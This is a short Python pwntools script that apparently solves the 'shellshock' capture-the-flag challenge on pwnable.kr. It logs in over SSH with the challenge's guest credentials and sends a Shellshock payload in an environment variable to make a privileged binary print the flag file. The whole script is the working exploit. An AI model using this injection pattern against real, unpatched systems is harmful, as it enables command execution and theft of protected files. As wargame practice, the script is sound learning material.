#! /usr/bin/python

from pwn import *

HOST = "pwnable.kr"
PORT = 2222

cmd = "env TEST='() { :; }; cat /home/shellshock/flag' ./shellshock"

s = ssh(host=HOST, user='shellshock',
        port=PORT, password='guest')

ret = s.run_to_end(cmd)

print ret[0]

s.close()
